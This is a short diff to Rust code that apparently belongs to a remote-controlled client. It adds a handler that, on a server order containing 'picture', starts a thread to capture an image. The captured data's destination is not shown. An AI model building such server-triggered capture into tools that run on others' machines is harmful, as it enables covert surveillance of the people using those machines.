@@ -43,6 +43,14 @@ pub(crate) fn ordre_du_srv(mut ordre: String) {
             });
         }
 
+        if shared_ordre.lock().unwrap().contains("picture") {
+            println!("Lancement de la capture d'image");
+            let ordre_clone = Arc::clone(&shared_ordre);
+            let t = thread::spawn(move || {
+                picture::picture();
+            });
+        }
+
         println!("{:?}", shared_ordre.lock().unwrap().as_str());
     }
 
